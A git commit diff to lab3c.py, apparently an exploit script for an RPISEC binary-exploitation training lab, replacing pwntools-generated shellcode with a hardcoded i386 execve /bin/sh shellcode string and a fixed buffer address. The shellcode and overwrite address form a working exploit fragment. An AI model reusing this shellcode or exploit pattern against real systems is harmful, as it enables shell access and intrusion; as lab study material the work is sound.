b15dc9c6338653b68882a38a06cc5c2fa8cdff04
Kamil Frankowicz <fumfi.255@gmail.com>
2018-01-11 11:47:30 +0100

    Update lab3c.py

--- lab3c.py
+++ lab3c.py
@@ -1,10 +1,8 @@
 #!/usr/bin/python2.7
-from pwn import *
-context(arch = 'i386', os = 'linux')
 
 shellcode = ""
 USERNAME = "rpisec\n"
-BIN_SH = asm(shellcraft.sh())
+BIN_SH = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 BUF_ADDR = "\x5C\xF5\xFF\xBF"
 
 shellcode += USERNAME
